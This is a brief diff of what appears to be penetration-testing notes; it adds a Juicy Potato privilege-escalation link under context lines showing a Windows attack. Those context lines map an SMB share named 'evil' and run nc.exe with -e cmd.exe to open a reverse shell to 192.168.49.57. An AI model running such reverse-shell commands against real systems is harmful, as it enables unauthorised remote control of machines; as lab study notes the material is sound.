@@ -70,6 +70,8 @@ net use z: \\192.168.49.57\evil /user:evil evil
 Z:\nc.exe 192.168.49.57 80 -e cmd.exe
 ```
 
+# Juicy Potato
+https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise
 
 ## Binary Hijacking
 
